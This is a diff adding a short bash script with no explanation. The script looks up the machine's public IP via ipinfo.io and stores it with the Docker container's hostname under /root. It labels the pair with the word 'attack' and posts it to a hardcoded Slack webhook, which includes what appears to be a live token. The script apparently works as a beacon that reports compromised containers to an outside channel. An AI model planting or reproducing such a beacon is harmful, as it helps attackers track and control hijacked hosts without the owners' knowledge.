@@ -1,0 +1,9 @@
+#!/bin/bash
+curl -s ipinfo.io/ip > /root/ip_addr
+echo $HOSTNAME > /root/id_docker
+id_docker=$(cat /root/id_docker)
+ip_add=$(cat /root/ip_addr)
+
+rontab=$id_docker":attack"$ip_add
+
+curl -X POST -H 'Content-type: application/json' --data '{"text":"'$rontab'"}' https://hooks.slack.com/services/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
